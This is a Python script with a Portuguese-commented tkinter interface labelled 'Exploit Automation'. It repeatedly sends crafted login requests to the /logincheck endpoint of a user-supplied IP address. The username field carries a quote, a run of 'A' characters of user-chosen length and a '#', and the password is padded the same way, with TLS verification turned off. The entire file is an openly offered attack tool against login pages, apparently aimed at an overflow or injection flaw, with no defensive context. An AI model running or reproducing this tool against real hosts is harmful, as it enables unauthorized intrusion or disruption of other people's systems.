import requests
import tkinter as tk
from tkinter import messagebox
import threading
import time
import re

# Função para verificar se o IP tem formato válido
def is_valid_ip(ip):
    # Expressão regular simples para validar o formato do IP
    pattern = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return re.match(pattern, ip) is not None

# Função para enviar a requisição com o payload
def exploit(target_ip, payload_size):
    target = f"https://{target_ip}/logincheck"

    # Cria o payload com o tamanho especificado pelo usuário
    payload = {
        "csrfmiddlewaretoken": "6122679a72bea77cc07a16bc5ebbbe57",
        "username": "'" + "A" * payload_size + "#",  # Username com tamanho definido pelo usuário
        "password": "B" * payload_size,  # Password com tamanho definido pelo usuário
        "next": "",
        "login_button": "Login"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
        "Referer": target,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    while running:
        try:
            response = requests.post(target, data=payload, headers=headers, verify=False)  # Sem proxies
            print(f"Status Code: {response.status_code}")
            print(response.text)
            # Adiciona um delay para evitar requisições excessivas
            time.sleep(2)
        except Exception as e:
            print(f"Erro ao enviar requisição: {e}")
            break

# Função para iniciar o exploit
def start_exploit():
    global running
    target_ip = ip_entry.get()
    try:
        payload_size = int(payload_size_entry.get())  # Obtém o tamanho do payload inserido pelo usuário
        if payload_size <= 0:
            raise ValueError("O tamanho do payload deve ser maior que 0.")
    except ValueError as ve:
        messagebox.showerror("Erro", f"Erro no tamanho do payload: {ve}")
        return

    if not target_ip or not is_valid_ip(target_ip):
        messagebox.showerror("Erro", "Por favor, insira um IP válido.")
        return

    running = True
    # Cria uma thread para rodar a função de exploit em paralelo à interface
    exploit_thread = threading.Thread(target=exploit, args=(target_ip, payload_size))
    exploit_thread.start()

    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)

# Função para parar o exploit
def stop_exploit():
    global running
    running = False
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

# Configuração da interface gráfica
root = tk.Tk()
root.title("Exploit Automation")

# Campo para o usuário digitar o IP
ip_label = tk.Label(root, text="Digite o IP alvo:")
ip_label.pack(pady=5)

ip_entry = tk.Entry(root)
ip_entry.pack(pady=5)

# Campo para o usuário digitar o tamanho do payload
payload_size_label = tk.Label(root, text="Tamanho do Payload (em caracteres):")
payload_size_label.pack(pady=5)

payload_size_entry = tk.Entry(root)
payload_size_entry.pack(pady=5)

# Botão de iniciar e parar o exploit
start_button = tk.Button(root, text="Iniciar Exploit", command=start_exploit)
start_button.pack(pady=5)

stop_button = tk.Button(root, text="Parar Exploit", command=stop_exploit, state=tk.DISABLED)
stop_button.pack(pady=5)

# Variável global para controlar se o exploit deve continuar rodando
running = False

# Inicia a interface gráfica
root.mainloop()
